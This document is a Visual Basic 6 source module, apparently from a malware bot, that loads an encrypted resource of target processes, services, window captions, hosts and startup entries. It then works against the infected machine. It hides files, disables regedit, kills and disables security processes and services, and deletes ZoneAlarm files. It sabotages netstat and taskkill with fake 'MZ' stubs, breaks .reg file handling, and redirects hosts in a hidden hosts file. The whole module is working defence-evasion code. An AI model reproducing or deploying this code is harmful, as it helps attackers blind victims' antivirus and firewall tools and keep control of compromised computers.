Attribute VB_Name = "modKillStuff"
Option Explicit

'listing processes
Public strBadProcesses() As String
Public strBadServices() As String
Public strBadHosts() As String
Public strBadCaptions() As String
Public strBadStartup() As String

Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal blnheritHandle As Long, ByVal dwAppProcessId As Long) As Long
Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, lProcessID As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szexeFile As String * 260
End Type

Public Sub LoadKillLists()
    Dim bData() As Byte
    Dim sData As String
    Dim i As Long
    
    bData = LoadResData(2, "RES")
    
    'the tag below is so the encryption key changing
    'thing can find it
    '
    '[KILLLIST]
    Call DecipherBArray(bData, 61)
    sData = StrConv(bData, vbUnicode)
    
    Dim strSplit() As String
    strSplit = Split(sData, Chr$(2), 5)
    
    strBadProcesses = Split(strSplit(0), Chr$(1))
    strBadServices = Split(strSplit(1), Chr$(1))
    strBadCaptions = Split(strSplit(2), Chr$(1))
    strBadHosts = Split(strSplit(3), Chr$(1))
    strBadStartup = Split(strSplit(4), Chr$(1))
    
    For i = 0 To UBound(strBadHosts)
        strBadHosts(i) = "1.1.1.1 " & strBadHosts(i)
    Next
End Sub

Public Sub ChangeSecuritySettings()
    Dim RegExplorerAdvanced As String
    Dim RegSystemPolicies As String
    RegExplorerAdvanced = "Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
    RegSystemPolicies = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
    'hide hidden and system files
    Call SaveDword(HKEY_CURRENT_USER, RegExplorerAdvanced, "Hidden", 2)
    Call SaveDword(HKEY_CURRENT_USER, RegExplorerAdvanced, "SuperHidden", 0)
    Call SaveDword(HKEY_CURRENT_USER, RegExplorerAdvanced, "ShowSuperHidden", 0)
    'disable regedit
    Call SaveString(HKEY_CURRENT_USER, RegSystemPolicies, "DisableRegistryTools", "1")
    'don't remember what this one does, but I must've put it here for a reason lol
    Call SaveString(HKEY_CURRENT_USER, RegSystemPolicies, "NoAdminPage", "1")
    'disable IE7 phishing filter
    Call SaveDword(HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\PhishingFilter", "Enabled", 1)
End Sub

Private Sub DisableCmd(strCmd As String)
    Dim strPath As String
    Dim intFileHandle As Integer
    
    strPath = Client.SystemDir & "\" & strCmd & ".com"
    If Not FileExists(strPath) Then
        intFileHandle = FreeFile
        Open strPath For Binary Access Write As #intFileHandle
        Put #intFileHandle, , "MZ"
        Close #intFileHandle
        Call SetAttr(strPath, vbHidden + vbSystem)
    End If
End Sub

Private Sub EnableCmd(strCmd As String)
    Call DeleteFile(Client.SystemDir & "\" & strCmd & ".com")
End Sub

Public Sub DisableCmds(blnDisable As Boolean)
    If blnDisable = True Then
        DisableCmd ("netstat")
        DisableCmd ("taskkill")
    Else
        EnableCmd ("netstat")
        EnableCmd ("taskkill")
    End If
End Sub

Public Sub KillZoneAlarm()
    On Local Error Resume Next

    Dim strZoneAlarmPath As String
    strZoneAlarmPath = GetString(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Zone Labs Client")
    If Len(strZoneAlarmPath) > 0 Then
        Dim lngSlashPos As Long
        Dim strNewPath As String
        
        lngSlashPos = InStrRev(strZoneAlarmPath, "\")
        strZoneAlarmPath = Left$(strZoneAlarmPath, lngSlashPos - 1)
        
        lngSlashPos = InStrRev(strZoneAlarmPath, "\")
        strNewPath = Left$(strZoneAlarmPath, lngSlashPos) & "Spaz"
        Name strZoneAlarmPath As strNewPath
        
        Call DeleteFile(strNewPath & "\repair\vsmon.exe")
        Call DeleteFile(strNewPath & "\zonealarm.exe")
        Call DeleteFile(strNewPath & "\zlclient.exe")
        Call DeleteFile(Client.SystemDir & "\ZoneLabs\vsmon.exe")
    End If
End Sub

Public Sub KillServices()
    Dim i As Long
    For i = 0 To UBound(strBadServices)
        If KeyExists(HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services\" & strBadServices(i)) Then
            DisableService (strBadServices(i))
        End If
    Next
End Sub

Private Sub DisableService(strService As String)
    Call Shell("net stop """ & strService & """", vbHide)
    Call Shell("sc config """ & strService & """ start= disabled", vbHide)
    DoEventsWait (1)
End Sub

Public Sub KillStartup()
    Dim i As Long
    
    For i = 0 To UBound(strBadStartup)
        Call DeleteValue(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", strBadStartup(i))
        Call DeleteValue(HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", strBadStartup(i))
    Next
End Sub

Public Sub EnableRegfiles(blnEnable As Boolean)
    If blnEnable = True Then
        Call SaveString(HKEY_CLASSES_ROOT, "regfile\shell\open\command", vbNullString, "regedit.exe ""%1""")
    Else
        Call SaveString(HKEY_CLASSES_ROOT, "regfile\shell\open\command", vbNullString, """%1""")
    End If
End Sub

Public Sub ListProcesses(ByRef strProcesses() As String, ByRef lngPIDs() As Long, ByRef lngCount As Long)
    On Local Error Resume Next
    Dim uProcess As PROCESSENTRY32
    Dim rProcessFound As Long
    Dim hSnapshot As Long
    Dim szExename As String
    Dim lngPos As Long
    
    Const TH32CS_SNAPPROCESS As Long = 2&
    
    uProcess.dwSize = Len(uProcess)
    hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    rProcessFound = ProcessFirst(hSnapshot, uProcess)
    
    Do While rProcessFound
        lngPos = InStr(1, uProcess.szexeFile, Chr(0))
        szExename = LCase$(VBA.Left$(uProcess.szexeFile, lngPos - 1))
        ReDim Preserve strProcesses(lngCount)
        strProcesses(lngCount) = szExename
        ReDim Preserve lngPIDs(lngCount)
        lngPIDs(lngCount) = uProcess.th32ProcessID
        lngCount = lngCount + 1
        
        rProcessFound = ProcessNext(hSnapshot, uProcess)
    Loop

    Call CloseHandle(hSnapshot)
End Sub

Public Sub KillSingleProcess(ByVal strExeName As String)
    On Local Error Resume Next
    Dim uProcess As PROCESSENTRY32
    Dim rProcessFound As Long
    Dim hSnapshot As Long
    Dim szExename As String
    Dim lngPos As Long
    
    Const TH32CS_SNAPPROCESS As Long = 2&
    
    strExeName = LCase$(strExeName)
    
    uProcess.dwSize = Len(uProcess)
    hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    rProcessFound = ProcessFirst(hSnapshot, uProcess)
    
    Do While rProcessFound
        lngPos = InStr(1, uProcess.szexeFile, Chr(0))
        szExename = LCase$(VBA.Left$(uProcess.szexeFile, lngPos - 1))
        If (Len(szExename) = Len(strExeName)) And (szExename = strExeName) Then
            Call KillProcess(uProcess.th32ProcessID)
            DoEvents
        End If

        rProcessFound = ProcessNext(hSnapshot, uProcess)
    Loop

    Call CloseHandle(hSnapshot)
End Sub

Public Sub KillTheBadness()
    On Local Error Resume Next
    'Const PROCESS_ALL_ACCESS = &H1F0FFF
    Dim uProcess As PROCESSENTRY32
    Dim rProcessFound As Long
    Dim hSnapshot As Long
    Dim szExename As String
    'Dim ExitCode As Long
    'Dim myProcess As Long
    Dim lngPos As Long
    Dim lngLen As Long
    Dim i As Long
    
    Const TH32CS_SNAPPROCESS As Long = 2&
    
    uProcess.dwSize = Len(uProcess)
    hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    rProcessFound = ProcessFirst(hSnapshot, uProcess)
    
    Do While rProcessFound
        lngPos = InStr(1, uProcess.szexeFile, Chr(0))
        szExename = LCase$(VBA.Left$(uProcess.szexeFile, lngPos - 1))
        lngLen = Len(szExename)
        For i = 0 To UBound(strBadProcesses)
            If (lngLen = Len(strBadProcesses(i))) And (szExename = strBadProcesses(i)) Then
                'Call CloseProcess(uProcess.th32ProcessID)
                'DoEvents
                Call KillProcess(uProcess.th32ProcessID)
                DoEvents
            End If
        Next

        rProcessFound = ProcessNext(hSnapshot, uProcess)
    Loop

    Call CloseHandle(hSnapshot)
    
    'now go thru the processes and look at the window titles
    Dim CurrHWND As Long
    Dim Length As Long
    Dim TaskName As String
    CurrHWND = GetWindow(frmMain.hwnd, GW_HWNDFIRST)
    
    While CurrHWND <> 0
        Length = GetWindowTextLength(CurrHWND)
        TaskName = Space$(Length + 1)
        Length = GetWindowText(CurrHWND, TaskName, Length + 1)
        TaskName = VBA.Left$(TaskName, Len(TaskName) - 1)
        
        'Search and destroy :D
        If Length > 0 Then
            For i = 0 To UBound(strBadCaptions)
                If LCase$(TaskName) Like strBadCaptions(i) Then
                    Call KillProcess(, CurrHWND)
                End If
            Next
        End If
        CurrHWND = GetWindow(CurrHWND, GW_HWNDNEXT)
        
        DoEvents
    Wend
End Sub

Private Function CheckHost(ByVal strCheck As String) As Boolean
    Dim i As Long
    
    strCheck = LCase$(strCheck)
    
    For i = 0 To UBound(strBadHosts)
        If strCheck = strBadHosts(i) Then
            CheckHost = True
            Exit Function
        End If
    Next
    
    CheckHost = False
End Function


'Mess with windows hosts file
Public Sub BlockHosts(blnBlock As Boolean)
    On Local Error Resume Next
    If Client.WindowsVersion <> "XP" And Client.WindowsVersion <> "2K" And Client.WindowsVersion <> "2K3" Then Exit Sub
    
    Dim NewHostsFile As New clsStringBuilder
    Dim strFile As String
    Dim intFileHandle As Integer
    Dim strLine As String
    Dim lngCommentPos As Long
    Dim strTempLine As String
    Dim i As Long

    strFile = Client.SystemDir & "\drivers\etc\hosts"
    
    intFileHandle = FreeFile
    
    If FileExists(strFile) = False Then
        Open strFile For Output As #intFileHandle
        Close #intFileHandle
    End If
    
    Open strFile For Input As #intFileHandle
    While Not EOF(intFileHandle)
        Line Input #intFileHandle, strLine
        If Len(strLine) > 0 Then
            If IsNumeric(VBA.Left$(strLine, 1)) Then
                'It's not a comment line, so check if its one of our lines.
                'If it is, exclude it, cause we're gonna add ours again at the end.
                lngCommentPos = InStr(1, strLine, "#")
                If lngCommentPos > 0 Then
                    strTempLine = Trim$(VBA.Left$(strLine, lngCommentPos - 1))
                Else
                    strTempLine = Trim$(strLine)
                End If
                
                If CheckHost(strTempLine) = False Then
                    NewHostsFile.Append strTempLine & vbCrLf
                End If
            Else
                'its a comment line, add to new hosts file
                NewHostsFile.Append strLine & vbCrLf
            End If
        End If
    Wend
    Close #intFileHandle
    
    If blnBlock = True Then
        For i = 0 To UBound(strBadHosts)
            NewHostsFile.Append strBadHosts(i) & vbCrLf
        Next
    End If
    
    Call DeleteFile(strFile)
    DoEvents
    Open strFile For Binary Access Write As #intFileHandle
    Put #intFileHandle, , NewHostsFile.ToString
    Close #intFileHandle
    
    'so they can't edit it easily
    If blnBlock = True Then
        Call SetAttr(strFile, vbHidden + vbSystem)
    Else
        Call SetAttr(strFile, vbNormal)
    End If
End Sub
